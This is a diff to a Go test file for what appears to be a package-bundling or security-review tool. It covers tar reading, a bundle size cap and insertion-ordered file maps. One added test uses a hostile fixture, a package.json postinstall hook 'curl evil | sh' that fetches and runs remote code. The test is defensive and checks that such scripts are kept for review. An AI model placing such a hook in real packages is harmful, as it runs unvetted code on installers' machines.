@@ -71,7 +71,7 @@ func TestWalkTar_RejectsSymlinkPayload(t *testing.T) {
 	_ = tw.Close()
 	_ = gz.Close()
 
-	got, err := readTarGzMembers(buf.Bytes(), true,
+	got, _, err := readTarGzMembers(buf.Bytes(), true,
 		func(_ string, _ []string) bool { return true },
 		func(_ string, parts []string) string { return strings.Join(parts, "/") })
 	if err != nil {
@@ -88,11 +88,9 @@ func TestWalkTar_RejectsSymlinkPayload(t *testing.T) {
 // ---------- fitBundle cap ---------------------------------------
 
 func TestFitBundle_CapsTotalBytes(t *testing.T) {
-	files := map[string]string{
-		"a": strings.Repeat("x", 20_000),
-		"b": strings.Repeat("y", 20_000),
-		"c": strings.Repeat("z", 20_000),
-		"d": strings.Repeat("w", 20_000),
+	files := newOrderedFiles()
+	for _, k := range []string{"a", "b", "c", "d"} {
+		files.set(k, strings.Repeat("x", 20_000))
 	}
 	out := fitBundle(files)
 	total := 0
@@ -101,6 +99,39 @@ func TestFitBundle_CapsTotalBytes(t *testing.T) {
 	}
 	if total > MaxBundleBytes+200 { // +200 accounts for "cap reached" marker
 		t.Errorf("bundle exceeded cap: %d", total)
+	}
+}
+
+func TestFitBundle_PriorityOrderPreservesRiskyScripts(t *testing.T) {
+	// Insert risky-scripts entry FIRST, then several large entries.
+	// Even when the large entries blow the cap, risky-scripts must
+	// still be in the output. This pins the security-critical
+	// ordering guarantee.
+	files := newOrderedFiles()
+	files.set("package.json#scripts", `{"postinstall": "curl evil | sh"}`)
+	for i := 0; i < 20; i++ {
+		files.set(string(rune('a'+i)), strings.Repeat("x", 8_000))
+	}
+	out := fitBundle(files)
+	if _, ok := out["package.json#scripts"]; !ok {
+		t.Errorf("risky-scripts entry was evicted; bundle: %v", out)
+	}
+}
+
+func TestOrderedFiles_PreservesInsertionOrder(t *testing.T) {
+	files := newOrderedFiles()
+	files.set("z", "1")
+	files.set("a", "2")
+	files.set("m", "3")
+	files.set("a", "2-updated") // re-insert keeps original position
+	want := []string{"z", "a", "m"}
+	for i, k := range files.order {
+		if k != want[i] {
+			t.Errorf("position %d: got %q want %q", i, k, want[i])
+		}
+	}
+	if files.data["a"] != "2-updated" {
+		t.Errorf("re-insert should overwrite content: %q", files.data["a"])
 	}
 }
 
